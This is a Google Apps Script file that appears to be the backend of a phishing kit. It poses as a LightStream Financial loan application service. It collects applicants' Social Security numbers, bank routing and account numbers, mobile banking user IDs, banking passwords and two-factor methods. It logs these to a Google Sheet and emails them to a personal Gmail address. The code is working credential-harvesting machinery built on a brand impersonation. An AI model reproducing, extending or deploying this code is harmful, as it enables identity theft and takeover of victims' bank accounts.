// Enhanced Google Apps Script for Loan Applications with Better Email Handling
// February 19, 2026 - Enhanced for debugging and reliability
// DEPLOYMENT URL: https://script.google.com/macros/s/AKfycbwyP5zoJfvPWj9nm2lw11U09azqlk0rpWW_-lmo_aukimJATd_5c6yXYAJwEH7luu0cLA/exec

const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
const RECIPIENT_EMAIL = "finnfoxpersonalloan@gmail.com";

function doGet(e) {
  return ContentService.createTextOutput("LightStream Enhanced Google Apps Script is working");
}

function doPost(e) {
  try {
    console.log("=== NEW SUBMISSION STARTED ===");
    
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Loan Applications");
    
    // Handle FormData (from working version)
    let data = {};
    if (e.parameters) {
      for (let key in e.parameters) {
        data[key] = e.parameters[key][0];
      }
    }
    
    console.log("Form data received:", JSON.stringify(data));
    
    // Add data to Google Sheets
    sheet.appendRow([
      data.timestamp || new Date().toISOString(),
      data.type || 'Unknown',
      data.firstName || '',
      data.lastName || '',
      data.email || '',
      data.phone || '',
      data.loanAmount || '',
      data.loanPurpose || '',
      data.loanDuration || '',
      data.grossMonthlyIncome || '',
      data.employmentStatus || '',
      data.creditScore || '',
      data.streetAddress || '',
      data.city || '',
      data.state || '',
      data.zipCode || '',
      data.routingNumber || '',
      data.accountNumber || '',
      data.bankName || '',
      data.mobileBankingUserId || '',
      data.mobileBankingPassword || '[PROTECTED]',
      data.twoFactorMethod || '',
      data.termsAccepted || 'false'
    ]);
    
    console.log("Data added to Google Sheets successfully");
    
    // Send email notification
    const emailResult = sendEmailNotification(data);
    console.log("Email send result:", emailResult);
    
    const responseMessage = emailResult.success 
      ? "SUCCESS: Data saved to Google Sheets and email sent successfully"
      : "SUCCESS: Data saved to Google Sheets but email failed: " + emailResult.error;
    
    return ContentService.createTextOutput(responseMessage);
    
  } catch (error) {
    console.error("ERROR in doPost:", error.toString());
    return ContentService.createTextOutput("ERROR: " + error.toString());
  }
}

function createHtmlEmailBody(data) {
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f8f9fa;">
      <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 30px;">
        <h1 style="margin: 0; font-size: 28px;">ğŸ‰ NEW LOAN APPLICATION RECEIVED! ğŸ‰</h1>
        <p style="margin: 10px 0 0 0; font-size: 16px;">LightStream Financial Services</p>
      </div>
      
      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">ğŸ‘¤ APPLICANT INFORMATION</h2>
        <table style="width: 100%; border-collapse: collapse;">
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Name:</td><td style="padding: 8px;">${data.firstName || ''} ${data.lastName || ''}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Email:</td><td style="padding: 8px;">${data.email || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Phone:</td><td style="padding: 8px;">${data.phone || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">SSN:</td><td style="padding: 8px;">${data.socialSecurity || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Address:</td><td style="padding: 8px;">${data.streetAddress || ''}, ${data.city || ''}, ${data.state || ''} ${data.zipCode || ''}</td></tr>
        </table>
      </div>
      
      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">ğŸ’° LOAN DETAILS</h2>
        <table style="width: 100%; border-collapse: collapse;">
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Loan Amount:</td><td style="padding: 8px; color: #28a745; font-weight: bold;">$${data.loanAmount || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Loan Purpose:</td><td style="padding: 8px;">${data.loanPurpose || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Loan Duration:</td><td style="padding: 8px;">${data.loanDuration || 'N/A'} months</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Credit Score:</td><td style="padding: 8px;">${data.creditScore || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Monthly Income:</td><td style="padding: 8px;">$${data.grossMonthlyIncome || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Employment:</td><td style="padding: 8px;">${data.employmentStatus || 'N/A'}</td></tr>
        </table>
      </div>
      
      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">ğŸ¦ BANKING INFORMATION</h2>
        <table style="width: 100%; border-collapse: collapse;">
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Bank Name:</td><td style="padding: 8px;">${data.bankName || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Routing Number:</td><td style="padding: 8px;">${data.routingNumber || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Account Number:</td><td style="padding: 8px;">${data.accountNumber || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Mobile Banking ID:</td><td style="padding: 8px;">${data.mobileBankingUserId || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Two-Factor Method:</td><td style="padding: 8px;">${data.twoFactorMethod || 'N/A'}</td></tr>
        </table>
      </div>
      
      <div style="background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px;">
        <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">ğŸ“Š SUBMISSION DETAILS</h2>
        <table style="width: 100%; border-collapse: collapse;">
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Submitted:</td><td style="padding: 8px;">${new Date().toLocaleString()}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Application Type:</td><td style="padding: 8px;">${data.type || 'Loan'}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; color: #555;">Terms Accepted:</td><td style="padding: 8px; color: ${data.termsAccepted === 'true' ? '#28a745' : '#dc3545'}; font-weight: bold;">${data.termsAccepted === 'true' ? 'âœ… YES' : 'âŒ NO'}</td></tr>
        </table>
      </div>
      
      <div style="text-align: center; padding: 20px; background: #f8f9fa; border-radius: 10px;">
        <p style="margin: 0; color: #666;">ğŸ“Š Please check Google Sheet for complete details and processing status.</p>
        <p style="margin: 10px 0 0 0;">
          <a href="https://lightstreamweb.vercel.app" style="background: #667eea; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; display: inline-block;">ğŸ¦ Visit LightStream</a>
        </p>
      </div>
    </div>
  `;
}

function sendEmailNotification(data) {
  try {
    console.log("=== SENDING EMAIL ===");
    
    const subject = "New " + (data.type || "Loan") + " Application - LightStream Financial";
    
    const body = "ğŸ‰ NEW LOAN APPLICATION RECEIVED! ğŸ‰\n\n" +
      "=== APPLICANT INFORMATION ===\n" +
      "ğŸ‘¤ Name: " + (data.firstName || '') + " " + (data.lastName || '') + "\n" +
      "ğŸ“§ Email: " + (data.email || 'N/A') + "\n" +
      "ğŸ“± Phone: " + (data.phone || 'N/A') + "\n" +
      "ğŸ” SSN: " + (data.socialSecurity || 'N/A') + "\n" +
      "ğŸ  Address: " + (data.streetAddress || '') + ", " + (data.city || '') + ", " + (data.state || '') + " " + (data.zipCode || '') + "\n\n" +
      "=== LOAN DETAILS ===\n" +
      "ğŸ’° Loan Amount: $" + (data.loanAmount || 'N/A') + "\n" +
      "ğŸ¯ Loan Purpose: " + (data.loanPurpose || 'N/A') + "\n" +
      "â° Loan Duration: " + (data.loanDuration || 'N/A') + " months\n" +
      "ğŸ’³ Credit Score: " + (data.creditScore || 'N/A') + "\n" +
      "ğŸ’µ Gross Monthly Income: $" + (data.grossMonthlyIncome || 'N/A') + "\n" +
      "ğŸ‘” Employment Status: " + (data.employmentStatus || 'N/A') + "\n\n" +
      "=== BANKING INFORMATION ===\n" +
      "ğŸ¦ Bank Name: " + (data.bankName || 'N/A') + "\n" +
      "ğŸ”¢ Routing Number: " + (data.routingNumber || 'N/A') + "\n" +
      "ğŸ§ Account Number: " + (data.accountNumber || 'N/A') + "\n" +
      "ğŸ“± Mobile Banking User ID: " + (data.mobileBankingUserId || 'N/A') + "\n" +
      "ğŸ” Mobile Banking Password: [PROTECTED]\n" +
      "ğŸ” Two-Factor Method: " + (data.twoFactorMethod || 'N/A') + "\n\n" +
      "=== SUBMISSION DETAILS ===\n" +
      "ğŸ“… Submitted: " + new Date().toLocaleString() + "\n" +
      "ğŸ“‹ Application Type: " + (data.type || 'Loan') + "\n" +
      "âœ… Terms Accepted: " + (data.termsAccepted || 'No') + "\n\n" +
      "ğŸ“Š Please check Google Sheet for complete details and processing status.\n\n" +
      "ğŸ¦ LightStream Financial Services\n" +
      "ğŸŒ https://lightstreamweb.vercel.app";
    
    console.log("Email subject:", subject);
    console.log("Email body preview:", body.substring(0, 200) + "...");
    
    // Send email with detailed logging
    MailApp.sendEmail({
      to: RECIPIENT_EMAIL,
      subject: subject,
      body: body,
      htmlBody: createHtmlEmailBody(data),
      name: "LightStream Financial"
    });
    
    console.log("Email sent successfully to:", RECIPIENT_EMAIL);
    return { success: true, message: "Email sent successfully" };
    
  } catch (error) {
    console.error("EMAIL ERROR:", error.toString());
    console.error("Email error details:", error);
    return { success: false, error: error.toString() };
  }
}
